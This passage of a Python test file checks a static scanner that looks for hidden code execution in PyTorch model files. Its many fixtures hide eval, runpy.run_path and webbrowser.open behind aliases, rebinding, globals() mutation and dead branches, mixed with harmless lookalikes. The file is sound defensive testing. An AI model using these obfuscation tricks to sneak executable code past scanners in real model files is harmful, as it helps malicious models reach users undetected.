                b"import webbrowser as wb\nfrom importlib import reload as refresh\nwb.open = print\n"
                b"(refresh := print)\nrefresh(wb)\nwb.open('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nfrom importlib import reload as refresh\nwb.open = print\n"
                b"for refresh in [print]:\n    pass\nrefresh(wb)\nwb.open('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nfrom importlib import reload as refresh\nwb.open = print\n"
                b"((refresh := print), refresh(wb))\nwb.open('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb, importlib\nrefresh = importlib.reload\nwb.open = print\n"
                b"list((refresh := print) for _ in [1])\nrefresh(wb)\nwb.open('safe')\n",
                "Web browser launch detected",
            ),
        ],
    )
    def test_scan_model_preserves_safe_typed_state_after_reload_alias_rebinding(
        self,
        source: bytes,
        expected_pattern: str,
    ) -> None:
        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("source", "expected_pattern", "should_detect"),
        [
            (
                b"import runpy as old, sys\nold.run_path = print\ndel sys.modules['runpy']\n"
                b"import runpy as fresh\nold.run_path('safe')\n",
                "Dynamic module execution detected",
                False,
            ),
            (
                b"import runpy as old, sys\nold.run_path = print\ndel sys.modules['runpy']\n"
                b"import runpy as fresh\nfresh.run_path('payload.py')\n",
                "Dynamic module execution detected",
                True,
            ),
            (
                b"import webbrowser as old, sys\nold.open = print\ndel sys.modules['webbrowser']\n"
                b"import webbrowser as fresh\nold.open('safe')\n",
                "Web browser launch detected",
                False,
            ),
            (
                b"import webbrowser as old, sys\nold.open = print\ndel sys.modules['webbrowser']\n"
                b"import webbrowser as fresh\nfresh.open('https://example.invalid')\n",
                "Web browser launch detected",
                True,
            ),
            (
                b"import runpy as old, sys\nold.run_path = print\nclass Payload:\n"
                b"    del sys.modules['runpy']\n    import runpy as fresh\n    old.run_path('safe')\n",
                "Dynamic module execution detected",
                False,
            ),
        ],
    )
    def test_scan_model_tracks_module_generations_after_cache_eviction(
        self,
        source: bytes,
        expected_pattern: str,
        should_detect: bool,
    ) -> None:
        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )
        assert detected is should_detect

    def test_typed_safe_overwrite_rejects_cross_dependent_tuple_swap(self) -> None:
        source = (
            "import webbrowser as wb\nmapping = wb.__dict__\nalias = {}\n"
            "alias, mapping = mapping, alias\nmapping.update(open=print)\n"
        )

        assert jit_script_module._compact_snippet_typed_print_overwrite_calls(source) == set()

    @pytest.mark.parametrize(
        "unrelated_delete",
        [
            b"del other.run_path\n",
            b"other.__dict__.pop('run_path')\n",
            b"dict.pop(other.__dict__, 'run_path')\n",
        ],
    )
    def test_scan_model_keeps_runpy_call_after_unrelated_delete_before_setdefault(
        self,
        unrelated_delete: bytes,
    ) -> None:
        detector = JITScriptDetector()
        data = (
            b"import runpy as rp\nclass Other:\n    pass\n"
            b"other = Other()\nother.run_path = print\n"
            + unrelated_delete
            + b"rp.__dict__.setdefault('run_path', print)\nrp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "module_print_mutation",
        [
            b"globals()['print'] = eval\n",
            b"globals().__setitem__('print', eval)\n",
            b"globals().setdefault('print', eval)\n",
            b"globals().update(**{'print': eval})\n",
            b"dict.__setitem__(globals(), 'print', eval)\n",
            b"locals().__setitem__('print', eval)\n",
            b"namespace = globals()\nnamespace['print'] = eval\n",
            b"put = globals().__setitem__\nput('print', eval)\n",
            b"update = globals().update\nupdate(print=eval)\n",
            b"globals().update(**{'print': eval})\n",
            b"v = vars\nv(__builtins__).update(print=eval)\n",
            b"if enabled:\n    globals()['print'] = eval\n",
            b"__builtins__.print = eval\n",
            b"__builtins__['print'] = eval\n",
        ],
    )
    def test_scan_model_keeps_runpy_call_after_module_print_mutation(
        self,
        module_print_mutation: bytes,
    ) -> None:
        detector = JITScriptDetector()
        data = b"import runpy as rp\n" + module_print_mutation + b"rp.run_path = print\nrp.run_path('payload.py')\n"

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "module_print_mutation",
        [
            b"if False:\n    globals()['print'] = eval\n",
            b"globals = lambda: {}\nglobals()['print'] = eval\n",
            b"v = vars\nv = lambda _value: {}\nv(__builtins__).update(print=eval)\n",
            b"dict = lambda *args: None\ndict.__setitem__(globals(), 'print', eval)\n",
        ],
    )
    def test_scan_model_keeps_safe_runpy_overwrite_when_module_print_mutation_is_inactive(
        self,
        module_print_mutation: bytes,
    ) -> None:
        detector = JITScriptDetector()
        data = b"import runpy as rp\n" + module_print_mutation + b"rp.run_path = print\nrp.run_path('safe')\n"

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = [eval]\n"
                b"    callbacks[0] = len\n"
                b"    return callbacks[0](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = {'safe': len, 'unused': eval}\n"
                b"    return callbacks['safe'](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = {'run': eval}\n"
                b"    callbacks['run'] = len\n"
                b"    return callbacks.get('run')(value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = [[eval]]\n"
                b"    callbacks[0][0] = len\n"
                b"    return callbacks[0][0](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = [eval]\n"
                b"    callbacks[0] = len\n"
                b"    return callbacks[-1](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = [eval]\n"
                b"    callbacks[-1] = len\n"
                b"    return callbacks[0](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = [eval]\n"
                b"    alias = callbacks\n"
                b"    alias[0] = len\n"
                b"    return callbacks[0](value)\n"
            ),
            (
                b"\x00\xffdef benign(value, flag):\n"
                b"    callbacks = [eval] if flag else {0: eval}\n"
                b"    callbacks[0] = len\n"
                b"    return callbacks[0](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    object = helper\n"
                b"    return object.__getattribute__(__builtins__, 'eval')(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder):\n"
                b"    holder.sink = eval\n"
                b"    holder.sink = len\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder):\n"
                b"    holder.sink = eval\n"
                b"    holder = replacement\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder):\n"
                b"    setattr(holder, 'sink', eval)\n"
                b"    setattr(holder, 'sink', len)\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder):\n"
                b"    setattr(holder, 'sink', eval)\n"
                b"    holder = replacement\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder):\n"
                b"    object.__setattr__(holder, 'sink', eval)\n"
                b"    object.__setattr__(holder, 'sink', len)\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder, setattr):\n"
                b"    setattr(holder, 'sink', eval)\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder, object):\n"
                b"    object.__setattr__(holder, 'sink', eval)\n"
                b"    return holder.sink(value)\n"
            ),
            (b"\x00\xffcallbacks = [eval]\ndef benign(value, callbacks):\n    return callbacks[0](value)\n"),
            (b"\x00\xffdef benign(value, callbacks=[eval]):\n    callbacks[0] = len\n    return callbacks[0](value)\n"),
        ],
    )
    def test_scan_model_avoids_stale_indirect_builtin_aliases(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (b"\x00\xffdef payload(value, callbacks=[eval]):\n    return callbacks[0](value)\n"),
            (b"\x00\xffdef payload(value, *, callbacks={'run': eval}):\n    return callbacks['run'](value)\n"),
        ],
    )
    def test_scan_model_detects_dangerous_builtins_in_default_containers(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "return list(map(eval, values))",
            "return list(filter(eval, values))",
            "return sorted(values, key=eval)",
            "return min(values, key=eval)",
            "return max(values, key=eval)",
            "import functools\n    return functools.partial(eval, values[0])()",
            "import functools as ft\n    return ft.partial(eval, values[0])()",
            "from functools import partial as bind\n    runner = bind(eval, values[0])\n    return runner()",
        ],
    )
    def test_scan_model_detects_dangerous_builtins_used_as_callbacks(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef payload(values):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (b"\x00\xffdef benign(values, map):\n    return list(map(eval, values))\n"),
            (b"\x00\xffdef benign(values, sorted):\n    return sorted(values, key=eval)\n"),
            (b"\x00\xffdef benign(value, functools):\n    return functools.partial(eval, value)()\n"),
            (
                b"\x00\xffdef benign(value):\n"
                b"    from functools import partial\n"
                b"    partial = helper\n"
                b"    return partial(eval, value)()\n"
            ),
            (b"\x00\xffdef benign(value):\n    import functools\n    return functools.partial(eval, value)\n"),
            (b"\x00\xffdef benign(value):\n    return helper(eval, value)\n"),
        ],
    )
    def test_scan_model_avoids_noninvoking_or_shadowed_callback_lookalikes(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "callbacks = [eval]\n    (sink,) = callbacks\n    return sink(value)",
            "callbacks = [[eval]]\n    ((sink,),) = callbacks\n    return sink(value)",
            "callbacks = [eval]\n    for sink in callbacks:\n        return sink(value)",
            "callbacks = [(eval, 1)]\n    for sink, _ in callbacks:\n        return sink(value)",
        ],
    )
    def test_scan_model_resolves_dangerous_builtins_from_tracked_sequence_state(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef payload(value):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "callbacks = [eval]\n    callbacks[0] = len\n    (sink,) = callbacks\n    return sink(value)",
            "callbacks = [eval]\n    callbacks[0] = len\n    for sink in callbacks:\n        return sink(value)",
            "callbacks = {0: eval}\n    (sink,) = callbacks\n    return sink(value)",
            "callbacks = {'run': eval}\n    for sink in callbacks:\n        return sink(value)",
        ],
    )
    def test_scan_model_avoids_stale_tracked_sequence_state(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef benign(value):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "name = 'eval'\n    return getattr(__builtins__, name)(value)",
            "name = 'ev' + 'al'\n    return __builtins__[name](value)",
            "name = 'eval'\n    return __builtins__.get(name)(value)",
            "name = 'eval'\n    return object.__getattribute__(__builtins__, name)(value)",
            "callbacks = {'run': eval}\n    name = 'run'\n    return callbacks[name](value)",
            "def inner(name='eval'):\n        return getattr(__builtins__, name)(value)\n    return inner()",
        ],
    )
    def test_scan_model_resolves_constant_string_aliases_for_builtin_lookup(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef payload(value):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "name = 'eval'\n    name = 'len'\n    return getattr(__builtins__, name)(value)",
            (
                "name = 'eval'\n    if False:\n        name = 'len'\n"
                "    name = 'len'\n    return __builtins__[name](value)"
            ),
            (
                "callbacks = {'run': eval}\n    name = 'run'\n    name = 'safe'\n"
                "    callbacks['safe'] = len\n    return callbacks[name](value)"
            ),
            (
                "def inner(name='eval'):\n        name = 'len'\n"
                "        return getattr(__builtins__, name)(value)\n    return inner()"
            ),
        ],
    )
    def test_scan_model_avoids_stale_constant_string_aliases(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef benign(value):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"\x00\xffclass Payload:\n"
                b"    def prepare(self):\n"
                b"        self.sink = eval\n"
                b"    def run(self, value):\n"
                b"        return self.sink(value)\n"
            ),
            (
                b"\x00\xffclass Payload:\n"
                b"    def prepare(self):\n"
                b"        setattr(self, 'sink', eval)\n"
                b"    def run(self, value):\n"
                b"        return self.sink(value)\n"
            ),
            (b"\x00\xffclass Payload:\n    sink = eval\n    def run(self, value):\n        return self.sink(value)\n"),
        ],
    )
    def test_scan_model_detects_dangerous_instance_aliases_across_methods(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"\x00\xffclass Benign:\n"
                b"    def prepare(self):\n"
                b"        self.sink = eval\n"
                b"        self.sink = len\n"
                b"    def run(self, value):\n"
                b"        return self.sink(value)\n"
            ),
            (
                b"\x00\xffclass Benign:\n"
                b"    def prepare(self):\n"
                b"        self.sink = eval\n"
                b"    def run(self, value):\n"
                b"        self.sink = len\n"
                b"        return self.sink(value)\n"
            ),
            (
                b"\x00\xffclass Benign:\n"
                b"    @staticmethod\n"
                b"    def prepare(holder):\n"
                b"        holder.sink = eval\n"
                b"    @staticmethod\n"
                b"    def run(holder, value):\n"
                b"        return holder.sink(value)\n"
            ),
        ],
    )
    def test_scan_model_avoids_stale_instance_aliases_across_methods(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    def test_scan_model_preserves_builtin_alias_across_dead_rebind_branch(self) -> None:
        detector = JITScriptDetector()
        data = b"\x00\xffdef payload():\n    sink = eval\n    if False:\n        sink = len\n    return sink('1+1')\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"\x00\xffdef payload():\n"
                b"    sink = eval\n"
                b"    for _ in []:\n"
                b"        sink = len\n"
                b"    return sink('1+1')\n"
            ),
            (
                b"\x00\xffdef payload():\n"
                b"    sink = eval\n"
                b"    while False:\n"
                b"        sink = len\n"
                b"    return sink('1+1')\n"
            ),
            b"\x00\xffdef payload(flag):\n    sink = eval if flag else len\n    return sink('1+1')\n",
            (
                b"\x00\xffdef payload():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        raise RuntimeError()\n"
                b"        sink = len\n"
                b"    except RuntimeError:\n"
                b"        pass\n"
                b"    return sink('1+1')\n"
            ),
            (
                b"\x00\xffdef payload():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        may_raise()\n"
                b"        sink = len\n"
                b"    except Exception:\n"
                b"        pass\n"
                b"    return sink('1+1')\n"
            ),
            (
                b"\x00\xffdef payload():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        sink = unresolved_name\n"
                b"    except Exception:\n"
                b"        pass\n"
                b"    return sink('1+1')\n"
            ),
            b"\x00\xffdef payload():\n    for sink in [eval]:\n        return sink('1+1')\n",
            b"\x00\xffdef payload():\n    for sink in [len, eval]:\n        sink('1+1')\n",
            b"\x00\xffdef payload():\n    for sink, _ in [(eval, 1)]:\n        return sink('1+1')\n",
            b"\x00\xffdef payload():\n    for module in [__builtins__]:\n        return module.eval('1+1')\n",
            b"\x00\xffdef payload():\n    return [sink('1+1') for sink in [eval]]\n",
            b"\x00\xffdef payload():\n    return list(sink('1+1') for sink in [eval])\n",
            b"\x00\xffdef payload():\n    return (sink := eval)('1+1')\n",
            b"\x00\xffdef payload():\n    return (eval or len)('1+1')\n",
            b"\x00\xffdef payload(sink=eval):\n    return sink('1+1')\n",
            (b"\x00\xffsink = eval\ndef payload(value: sink('1+1')):\n    return value\n"),
            b"\x00\xffsink = eval\ndef payload():\n    return sink('1+1')\n",
            b"\x00\xffmodule = __builtins__\ndef payload():\n    return module.eval('1+1')\n",
            b"\x00\xffsink = eval\ndef sink(value=sink('1+1')):\n    return value\n",
            b"\x00\xffsink = eval\nclass sink(sink('1+1')):\n    pass\n",
            (
                b"\x00\xffdef outer():\n"
                b"    sink = eval\n"
                b"    def inner():\n"
                b"        return sink('1+1')\n"
                b"    return inner()\n"
            ),
            b"\x00\xffclass Payload:\n    sink = eval\n    result = sink('1+1')\n",
            b"\x00\xffdef payload():\n    [sink := eval for _ in [1]]\n    return sink('1+1')\n",
            (b"\x00\xffclass Payload:\n    sink = eval\n    values = [value for value in sink('[1]')]\n"),
            (b"\x00\xffsink = eval\nclass Payload:\n    sink = len\n    def run(self):\n        return sink('1+1')\n"),
            (b"\x00\xffdef payload():\n    match [eval]:\n        case [sink]:\n            return sink('1+1')\n"),
            (
                b"\x00\xffdef payload(value):\n"
                b"    sink = len\n"
                b"    match value:\n"
                b"        case 0:\n"
                b"            sink = eval\n"
                b"        case _:\n"
                b"            sink = len\n"
                b"    return sink('1+1')\n"
            ),
        ],
    )
    def test_scan_model_preserves_builtin_alias_across_dead_control_flow(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (b"\x00\xffdef benign():\n    import builtins as b\n    b = object()\n    return b.eval('1')\n"),
            b"\x00\xffdef benign(builtins):\n    return builtins.eval('1')\n",
            b"\x00\xffdef benign(__builtins__):\n    return __builtins__.eval('1')\n",
            b"\x00\xffdef benign(eval):\n    return eval.__call__('1')\n",
            b"\x00\xffdef benign():\n    __builtins__ = object()\n    return __builtins__.eval('1')\n",
            (
                b"\x00\xffdef benign():\n"
                b"    getattr = lambda _value, _name: len\n"
                b"    return getattr(__builtins__, 'eval')('1')\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    vars = lambda _value: {'eval': len}\n"
                b"    return vars(__builtins__)['eval']('1')\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    globals = lambda: {'__builtins__': {'eval': len}}\n"
                b"    return globals()['__builtins__']['eval']('1')\n"
            ),
            (b"\x00\xffdef benign():\n    __builtins__ = {'eval': len}\n    return __builtins__['eval']('1')\n"),
            (b"\x00\xffdef benign():\n    sink = eval\n    for _ in [1]:\n        sink = len\n    return sink('1')\n"),
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    while True:\n"
                b"        sink = len\n"
                b"        break\n"
                b"    return sink('1')\n"
            ),
            b"\x00\xffdef benign():\n    sink = eval if False else len\n    return sink('1')\n",
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        sink = len\n"
                b"    except Exception:\n"
                b"        sink = str\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        sink = len\n"
                b"    except Exception:\n"
                b"        pass\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    safe_alias = len\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        sink = safe_alias\n"
                b"    except Exception:\n"
                b"        pass\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        sink = len\n"
                b"        may_raise()\n"
                b"    except Exception:\n"
                b"        pass\n"
                b"    return sink('1')\n"
            ),
            (b"\x00\xffdef benign():\n    for sink in [eval, len]:\n        pass\n    return sink('1')\n"),
            (b"\x00\xffdef benign():\n    for sink in [len, eval]:\n        break\n    return sink('1')\n"),
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    for _ in [1]:\n"
                b"        pass\n"
                b"    else:\n"
                b"        sink = len\n"
                b"    return sink('1')\n"
            ),
            b"\x00\xffdef benign():\n    return [sink('1') for sink in [eval] if False]\n",
            b"\x00\xffdef benign():\n    return [sink('1') for sink in [eval] for _ in []]\n",
            b"\x00\xffdef benign():\n    return [sink('1') for sink in [len]]\n",
            b"\x00\xffdef benign(holder):\n    return holder.__builtins__.eval('1')\n",
            b"\x00\xffdef benign():\n    return (eval and len)('1')\n",
            b"\x00\xffdef benign():\n    return (len or eval)('1')\n",
            b"\x00\xffdef benign():\n    return (lambda eval: eval('1'))(len)\n",
            b"\x00\xffdef benign():\n    module = __builtins__ if False else object()\n    return module.eval('1')\n",
            b"\x00\xffsink = eval\nsink = len\ndef benign():\n    return sink('1')\n",
            (b"\x00\xffmodule = __builtins__\nmodule = object()\ndef benign():\n    return module.eval('1')\n"),
            b"\x00\xffsink = eval\ndef benign():\n    sink('1')\n    sink = len\n",
            (b"\x00\xffclass Container:\n    sink = eval\n    def benign(self):\n        return sink('1')\n"),
            (b"\x00\xffclass Outer:\n    sink = eval\n    class Inner:\n        result = sink('1')\n"),
            (b"\x00\xffclass Benign:\n    sink = eval\n    values = [sink('1') for _ in [1]]\n"),
            (b"\x00\xffsink = eval\ndef benign():\n    global sink\n    sink = len\n    return sink('1')\n"),
            (
                b"\x00\xffdef outer():\n"
                b"    sink = eval\n"
                b"    def benign():\n"
                b"        nonlocal sink\n"
                b"        sink = len\n"
                b"        return sink('1')\n"
                b"    return benign()\n"
            ),
            (
                b"\x00\xffsink = eval\n"
                b"def benign():\n"
                b"    sink('1')\n"
                b"    def inner(value=(sink := len)):\n"
                b"        return value\n"
            ),
            (b"\x00\xffsink = eval\ndef benign(manager):\n    with manager() as sink:\n        return sink('1')\n"),
            b"\x00\xffdef benign():\n    sink = eval\n    del sink\n    return sink('1')\n",
            (
                b"\x00\xffdef benign():\n"
                b"    for sink in [eval, len]:\n"
                b"        for _ in [1]:\n"
                b"            break\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    sink = eval\n"
                b"    match value:\n"
                b"        case 0:\n"
                b"            sink = len\n"
                b"        case _:\n"
                b"            sink = str\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(flag):\n"
                b"    sink = eval\n"
                b"    if flag:\n"
                b"        return 0\n"
                b"    else:\n"
                b"        sink = len\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(flag):\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        if flag:\n"
                b"            raise RuntimeError()\n"
                b"        sink = len\n"
                b"    except RuntimeError:\n"
                b"        return 0\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    sink = len\n"
                b"    match value:\n"
                b"        case _ if False:\n"
                b"            sink = eval\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(flag):\n"
                b"    sink = eval\n"
                b"    while flag:\n"
                b"        sink = eval\n"
                b"        flag = False\n"
                b"    else:\n"
                b"        sink = len\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(flag):\n"
                b"    sink = eval\n"
                b"    while flag:\n"
                b"        sink = len\n"
                b"    else:\n"
                b"        sink = str\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(condition):\n"
                b"    sink = eval\n"
                b"    if condition:\n"
                b"        sink = len\n"
                b"    else:\n"
                b"        sink = str\n"
                b"    return sink('1')\n"
            ),
        ],
    )
    def test_scan_model_does_not_retain_shadowed_builtin_aliases(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            b"\x00\xffdef benign(stream):\n    return stream.open('x')\n",
            b"\x00\xffdef benign():\n    return 'open'\n",
        ],
    )
    def test_scan_model_does_not_flag_method_or_literal_as_builtin_call(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)
        assert not any(finding.type == "ast_dangerous_call" for finding in findings)
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            b"\x00\xffdef benign():\n    return 'eval(1)'\n",
            b"\x00\xffdef benign():\n    # eval(1)\n    return 1\n",
        ],
    )
    def test_scan_model_does_not_flag_literal_or_comment_execution_pattern(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "eval() call detected"
            for finding in findings
        )
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    def test_scan_model_carries_prefix_alias_shadowing_into_tail_context(self) -> None:
        detector = JITScriptDetector()
        prefix = b"\x00\xffclass Safe:\n    run_path = len\nimport runpy as rp\nrp = Safe()\n" + b"# prefix\n" * 1024
        tail = b"def payload():\n    return rp.run_path([])\n"
        source = prefix + (b"# middle\n" * 130_000) + tail

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_middle_tail_alias_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        tail_prefix = b"".join(f"def benign_tail_{index}():\n    return {index}\n\x00".encode() for index in range(24))
        tail_suffix = b"".join(f"def after_tail_{index}():\n    return {index}\n\x00".encode() for index in range(24))
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + b"\x00\xff"
            + tail_prefix
            + b"def payload():\n    return rp.run_path('payload.py')\n\x00"
            + tail_suffix
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_from_compound_prefix_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffif True: import runpy as rp\n"
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_full_prefixed_tail_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        tail_padding_line = b"    # tail\n"
        tail_padding = tail_padding_line * (
            (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES - 200) // len(tail_padding_line)
        )
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + b"\x00\xffdef payload():\n"
            + tail_padding
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_escaped_triple_quote_prefix_import_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\n'
            b'not closed \\"""\n'
            b"import runpy as rp\n"
            b'"""\n' + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_runpy_alias_from_framed_prefix_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrun = runpy.run_path\n" + filler + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_framed_tail_alias_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
